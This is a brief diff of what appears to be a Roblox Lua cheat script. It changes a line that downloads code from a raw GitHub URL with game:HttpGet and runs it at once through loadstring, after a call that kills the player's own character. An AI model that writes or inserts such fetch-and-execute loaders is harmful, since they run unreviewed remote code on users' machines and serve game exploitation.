@@ -49,4 +49,4 @@ while wait(0.00001) do
     end
 end
 game.Players.LocalPlayer.Character:BreakJoints()
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/pooslammer69/deeznuts/main/deez'),true))()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/pooslammer69/monkey/main/poop'),true))()
